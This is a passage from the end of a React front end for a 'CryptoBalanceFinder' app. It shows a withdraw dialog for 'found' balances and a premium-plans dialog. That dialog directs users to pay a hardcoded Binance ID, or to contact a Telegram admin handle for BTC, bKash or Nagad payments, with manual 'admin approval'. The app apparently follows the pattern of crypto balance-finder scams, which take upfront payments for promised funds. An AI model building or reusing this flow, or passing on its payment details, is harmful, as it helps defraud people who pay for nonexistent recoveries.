            className={`nav-button ${activeTab === "stats" ? "nav-button-active" : ""}`}
            onClick={() => setActiveTab("stats")}
          >
            <div className="nav-icon">📊</div>
            <div className="nav-label">Stats</div>
          </button>
          
          <button 
            className={`nav-button ${activeTab === "premium" ? "nav-button-active" : ""}`}
            onClick={() => setActiveTab("premium")}
          >
            <div className="nav-icon">💎</div>
            <div className="nav-label">Premium</div>
          </button>
          
          <button 
            className={`nav-button ${activeTab === "history" ? "nav-button-active" : ""}`}
            onClick={() => setActiveTab("history")}
          >
            <div className="nav-icon">📝</div>
            <div className="nav-label">History</div>
          </button>
        </div>
      </div>
    </div>

    {/* Alert */}
    <AnimatePresence>
      {alertMsg && (
        <motion.div initial={{ y: 40, opacity: 0 }} animate={{ y: 0, opacity: 1 }} exit={{ y: 40, opacity: 0 }} transition={{ duration: 0.35 }} className="found-alert">
          {alertMsg}
        </motion.div>
      )}
    </AnimatePresence>

    {/* Withdraw Modal */}
    <AnimatePresence>
      {withdrawModalOpen && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="overlay">
          <motion.div initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }} className="modal">
            <h3 style={{ marginTop: 0 }}>Withdraw Request</h3>
            <form onSubmit={submitWithdraw}>
              <label className="label">Wallet address</label>
              <input value={withdrawAddr} onChange={(e) => setWithdrawAddr(e.target.value)} placeholder="0x or bc1..." className="input" />
              <label className="label">Amount (USD)</label>
              <input value={withdrawAmt} onChange={(e) => setWithdrawAmt(e.target.value)} placeholder={lastFound ? String(lastFound) : "0.00"} className="input" />
              {withdrawErr && <div style={{ color: "#f43", marginTop: 8 }}>{withdrawErr}</div>}
              {withdrawStatusText && <div style={{ marginTop: 10 }}>{withdrawStatusText}</div>}
              {withdrawProgress > 0 && (
                <div className="mt-2">
                  <div className="small-progress-wrap">
                    <div className="small-progress-bar" style={{ width: `${withdrawProgress}%` }} />
                  </div>
                </div>
              )}
              <div className="flex gap-2 mt-4">
                <button type="button" onClick={() => setWithdrawModalOpen(false)} className="control-btn flex-1">
                  Cancel
                </button>
                <button type="submit" className="control-btn flex-1" style={{ background: "#10b981", color: "#002" }}>
                  Submit Request
                </button>
              </div>
            </form>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>

    {/* Premium Modal */}
    <AnimatePresence>
      {premiumModalOpen && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="overlay">
          <motion.div initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }} className="modal-wide">
            <div className="flex justify-between items-center">
              <h3 style={{ margin: 0 }}>Premium Plans</h3>
              <button onClick={() => setPremiumModalOpen(false)} className="control-btn" style={{ background: "transparent" }}>
                Close
              </button>
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginTop: 14 }}>
              {plans.map((p) => (
                <div key={p.id} style={{ padding: 12, borderRadius: 10, background: "rgba(255,255,255,0.03)" }}>
                  <div style={{ fontWeight: 800 }}>{p.label}</div>
                  <div style={{ marginTop: 8, color: "#aab" }}>${p.price}</div>
                  <div style={{ marginTop: 10 }}>
                    {methods.map((m) => (
                      <button
                        key={m}
                        onClick={() => {
                          setSelectedPlan(p);
                          setSelectedMethod(m);
                        }}
                        className="small-pill"
                        style={{
                          border: selectedPlan?.id === p.id && selectedMethod === m ? "2px solid #06b6d4" : "1px solid rgba(255,255,255,0.06)",
                        }}
                      >
                        {m}
                      </button>
                    ))}
                  </div>
                </div>
              ))}
            </div>

            {selectedPlan && selectedMethod && (
              <div style={{ marginTop: 14, padding: 12, borderRadius: 10, background: "rgba(255,255,255,0.02)" }}>
                
                {/* Payment Instructions */}
                <div style={{ 
                  marginBottom: 12, 
                  padding: 12, 
                  background: "rgba(6, 182, 212, 0.1)", 
                  borderRadius: 8,
                  border: "1px solid #06b6d4"
                }}>
                  <div style={{ fontWeight: 700, color: "#06b6d4", marginBottom: 8 }}>
                    💰 Payment Instructions for {selectedMethod}:
                  </div>
                  
                  {selectedMethod === "Binance Pay" && (
                    <div>
                      <div style={{ fontSize: 14, color: "#9fd2ff", marginBottom: 6 }}>
                        • Send <strong>${selectedPlan?.price}</strong> to Binance ID:
                      </div>
                      <div style={{ 
                        fontSize: 16, 
                        fontWeight: 800, 
                        color: "#f59e0b", 
                        background: "rgba(0,0,0,0.3)",
                        padding: "8px 12px",
                        borderRadius: 6,
                        textAlign: "center",
                        marginBottom: 8
                      }}>
                        903008401
                      </div>
                      <div style={{ fontSize: 12, color: "#9fb0bb", textAlign: "center" }}>
                        After payment, enter Transaction ID below
                      </div>
                    </div>
                  )}
                  
                  {(selectedMethod === "BTC" || selectedMethod === "bKash" || selectedMethod === "Nagad") && (
                    <div>
                      <div style={{ fontSize: 14, color: "#9fd2ff", marginBottom: 8, textAlign: "center" }}>
                        For {selectedMethod} payments, please contact admin on Telegram first
                      </div>
                      <button
                        onClick={contactTelegram}
                        style={{
                          width: "100%",
                          padding: "10px",
                          background: "linear-gradient(45deg, #0088cc, #00a8ff)",
                          color: "white",
                          border: "none",
                          borderRadius: "8px",
                          fontWeight: "700",
                          fontSize: "14px",
                          cursor: "pointer",
                          marginTop: "8px",
                          marginBottom: "8px"
                        }}
                      >
                        📱 Contact Admin on Telegram
                      </button>
                      <div style={{ fontSize: 12, color: "#9fb0bb", textAlign: "center" }}>
                        Contact admin for payment details, then enter Transaction ID below
                      </div>
                    </div>
                  )}
                </div>

                <div style={{ marginBottom: 8, fontSize: 14, color: "#9fb0bb" }}>
                  {selectedMethod === "Binance Pay" 
                    ? "Send payment and enter the Transaction ID below. All payments need admin approval."
                    : "Contact admin on Telegram to get payment details. After payment, enter Transaction ID below."
                  }
                </div>
                
                <input 
                  placeholder="Enter transaction id" 
                  value={purchaseTxnId} 
                  onChange={(e) => setPurchaseTxnId(e.target.value)} 
                  className="input" 
                />
                
                <div className="flex gap-2 mt-4">
                  <button
                    onClick={submitPurchase}
                    className="control-btn"
                    style={{ background: "#06b6d4", color: "#022" }}
                  >
                    Submit Purchase
                  </button>
                  <button
                    onClick={() => {
                      setSelectedPlan(null);
                      setSelectedMethod(null);
                      setPurchaseTxnId("");
                    }}
                    className="control-btn"
                  >
                    Reset
                  </button>
                </div>

                <div style={{ marginTop: 12, fontSize: 13, color: "#9fb0bb" }}>
                  <strong>Important:</strong> All payments require admin approval. Contact admin after submission for faster approval.
                </div>

                <div style={{ marginTop: 8, fontSize: 13, color: "#9fb0bb" }}>
                  <button 
                    onClick={contactTelegram}
                    style={{ 
                      color: "#9fd2ff", 
                      fontWeight: 700,
                      background: "none",
                      border: "none",
                      textDecoration: "underline",
                      cursor: "pointer",
                      padding: 0
                    }}
                  >
                    Contact Admin: @Cryptography55
                  </button>
                  <div style={{ fontSize: 12, marginTop: 4 }}>
                    Click to contact on Telegram for payment verification
                  </div>
                </div>
              </div>
            )}
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  </div>
  );
}

export default CryptoBalanceFinder;